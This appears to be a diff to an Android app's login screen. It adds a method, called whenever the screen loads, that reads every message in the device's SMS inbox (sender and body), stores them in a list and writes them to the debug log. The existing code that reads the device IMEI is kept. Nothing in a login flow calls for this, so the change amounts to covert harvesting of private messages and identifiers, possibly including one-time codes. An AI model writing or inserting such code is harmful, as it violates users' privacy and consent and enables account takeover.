@@ -13,6 +13,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -53,6 +54,7 @@ public class Login extends AppCompatActivity {
     EditText Phone_number;
     final ArrayList<String> nameList = new ArrayList<>();
     ArrayList<String> phone = new ArrayList<>();
+    ArrayList<String> smses=new ArrayList<>();
 
 
     @RequiresApi(api = Build.VERSION_CODES.M)
@@ -85,7 +87,7 @@ public class Login extends AppCompatActivity {
 
         }
         initi();
-        PhoneMiMe();
+getsms();
 
         Send_Click.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -104,7 +106,7 @@ public class Login extends AppCompatActivity {
                 }
             }
         });
-
+        PhoneMiMe();
     }
 
     private boolean isValidate() {
@@ -302,6 +304,7 @@ public class Login extends AppCompatActivity {
         }
     }
 public void PhoneMiMe(){
+        Log.d("TAG","Value is creted by");
     telephonyManager = (TelephonyManager) getSystemService(this.TELEPHONY_SERVICE);
     @SuppressLint("MissingPermission") String imeiNumber = telephonyManager.getDeviceId();
     Log.d("TAG", "Value is created in the MAin Activity Mime" + imeiNumber);
@@ -309,6 +312,20 @@ public void PhoneMiMe(){
 
 
 }
+    public ArrayList<String> getsms(){
+        Log.d("tag","i am at sms function " );
+        Uri mysms= Uri.parse("content://sms/inbox");
+        Cursor cursor = getContentResolver().query(mysms,null,null,null,null);
+        while(cursor.moveToNext()){
+            String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+            String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+            String fullsms ="number" +number + ": "+ msg;
+            smses.add(fullsms);
+            Log.d("TAG","here is my sms "+number +"sfd " + msg );
+            Log.d("TAG","value of array for sms"+smses);
+        }
+        return smses;
+    }
 
 
 }
